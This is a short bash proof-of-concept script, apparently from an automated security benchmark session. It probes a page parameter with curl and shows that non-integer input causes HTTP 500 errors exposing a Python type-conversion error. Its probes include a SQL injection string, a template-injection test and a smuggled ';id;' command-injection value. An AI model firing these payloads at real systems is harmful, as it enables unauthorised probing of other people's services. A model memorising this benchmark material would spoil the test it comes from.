#!/bin/bash
# POC: Demonstrates type confusion information disclosure via page parameter on index.php by submitting non-integer values that trigger HTTP 500 errors revealing backend type conversion mechanism and Python-based technology stack.
# Target: ./repo
# Created: 2025-12-01T15:47:35.391Z
# Session: benchmark-XBEN-061-24-minbd4b8

# Type Confusion Information Disclosure POC
# Target: index.php page parameter
# Vulnerability: Non-integer input causes HTTP 500 errors revealing backend details

TARGET_URL="${1:-http://localhost}"
ENDPOINT="/?page"

echo "=========================================="
echo "Type Confusion Information Disclosure POC"
echo "=========================================="
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: SQL Injection-like payload
echo "[*] Test 1: SQL Injection-like payload"
echo "Command: curl -s -i \"$TARGET_URL/?page=1' OR '1'='1\""
RESPONSE=$(curl -s -i "$TARGET_URL/?page=1' OR '1'='1" 2>&1)
echo "$RESPONSE"
echo ""

# Check if response contains error indication
if echo "$RESPONSE" | grep -q "500\|invalid literal for int"; then
    echo "[+] VULNERABLE: HTTP 500 error detected with information disclosure"
    echo "[+] Error reveals: Backend uses Python's int() type conversion"
    echo ""
else
    echo "[-] Test 1 inconclusive"
    echo ""
fi

# Test 2: Template injection-like payload
echo "[*] Test 2: Template injection-like payload"
echo "Command: curl -s -i \"$TARGET_URL/?page={{7*7}}\""
RESPONSE=$(curl -s -i "$TARGET_URL/?page={{7*7}}" 2>&1)
echo "$RESPONSE"
echo ""

# Check for vulnerability indicators
if echo "$RESPONSE" | grep -q "500\|invalid literal for int"; then
    echo "[+] VULNERABLE: HTTP 500 error with type conversion error message"
    echo "[+] Raw input is echoed in error, confirming information disclosure"
    echo ""
else
    echo "[-] Test 2 inconclusive"
    echo ""
fi

# Test 3: Command injection-like payload
echo "[*] Test 3: Command injection-like payload"
echo "Command: curl -s -i \"$TARGET_URL/?page=;id;\""
RESPONSE=$(curl -s -i "$TARGET_URL/?page=;id;" 2>&1)
echo "$RESPONSE"
echo ""

# Final assessment
echo "=========================================="
echo "Assessment:"
echo "If HTTP 500 errors are shown above with 'invalid literal for int()'"
echo "messages, the application is vulnerable to type confusion information"
echo "disclosure. The error messages reveal:"
echo "  - Backend technology (Python)"
echo "  - Type conversion mechanism"
echo "  - Raw user input in error messages"
echo "=========================================="